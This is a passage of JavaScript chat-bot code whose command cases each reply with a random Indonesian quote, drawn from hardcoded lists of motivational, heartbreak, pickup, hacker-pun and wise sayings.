"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break
//=========================================\\======
case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  reply(bacotan)

}
break
//=========================================\\======
case 'quoteshacker': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesbijak':{
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const quotes = [
"Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
"Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
"Sakit dalam perjuangan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
"Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
"Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
"Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
"Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
"Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
"Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
